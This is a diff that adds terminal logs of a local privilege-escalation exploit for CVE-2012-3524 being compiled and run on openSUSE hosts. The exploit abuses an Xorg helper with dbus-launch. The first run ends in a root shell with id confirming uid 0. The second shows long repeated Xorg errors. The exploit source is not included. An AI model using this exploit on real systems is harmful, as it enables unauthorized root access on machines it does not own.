@@ -1,0 +1,303 @@
+shawn@localhost:~> gcc 21323-dbus_local_pri_esc.c 
+shawn@localhost:~> ./a.out 
+[**] CVE-2012-3524 xSports -- this is not a dbus exploit!
+
+[*] Preparing ...
+[+] Using Xorg helper ...
+[*] Waiting 10s for dbus-launch to drop boomshell.
+
+X.Org X Server 1.6.5
+Release Date: 2009-10-11
+X Protocol Version 11, Revision 0
+Build Operating System: openSUSE SUSE LINUX
+Current Operating System: Linux localhost 3.0.13-0.27-default #1 SMP Wed Feb 15 13:33:49 UTC 2012 (d73692b) x86_64
+Build Date: 04 February 2012  12:23:13PM
+ 
+	Before reporting problems, check http://wiki.x.org
+	to make sure that you have the latest version.
+Markers: (--) probed, (**) from config file, (==) default setting,
+	(++) from command line, (!!) notice, (II) informational,
+	(WW) warning, (EE) error, (NI) not implemented, (??) unknown.
+(==) Log file: "/var/log/Xorg.7350.log", Time: Tue Oct  9 10:25:20 2012
+(==) Using config file: "/etc/X11/xorg.conf"
+(EE) Failed to load module "freetype" (module does not exist, 0)
+.......
+
+...
+[!] Hurra!
+bash-3.2# 
+bash-3.2# 
+bash-3.2# id
+uid=0(root) gid=100(users) groups=0(root),16(dialout),33(video),100(users)
+
+shawn@linux-ije7:~> gcc 21323-dbus_local_pri_esc.c 
+shawn@linux-ije7:~> ./a.out 
+[**] CVE-2012-3524 xSports -- this is not a dbus exploit!
+
+[*] Preparing ...
+[+] Using Xorg helper ...
+[*] Waiting 10s for dbus-launch to drop boomshell.
+
+X.Org X Server 1.6.5
+Release Date: 2009-10-11
+X Protocol Version 11, Revision 0
+Build Operating System: openSUSE SUSE LINUX
+Current Operating System: Linux linux-ije7 3.0.38-0.5-default #1 SMP Fri Aug 3 09:02:17 UTC 2012 (358029e) x86_64
+Build Date: 29 June 2012  07:53:13PM
+ 
+	Before reporting problems, check http://wiki.x.org
+	to make sure that you have the latest version.
+Markers: (--) probed, (**) from config file, (==) default setting,
+	(++) from command line, (!!) notice, (II) informational,
+	(WW) warning, (EE) error, (NI) not implemented, (??) unknown.
+(==) Log file: "/var/log/Xorg.7350.log", Time: Mon Oct  1 23:51:04 2012
+(==) Using config file: "/etc/X11/xorg.conf"
+(EE) Failed to load module "freetype" (module does not exist, 0)
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+(EE) FBDEV(0): FBIOPUTCMAP: Invalid argument
+.(EE) config/hal: NewInputDeviceRequest failed (8)
+(EE) config/hal: NewInputDeviceRequest failed (8)
+(EE) config/hal: NewInputDeviceRequest failed (8)
+(EE) config/hal: NewInputDeviceRequest failed (8)
+(EE) config/hal: NewInputDeviceRequest failed (8)
+(EE) config/hal: NewInputDeviceRequest failed (8)
+...
+......
+
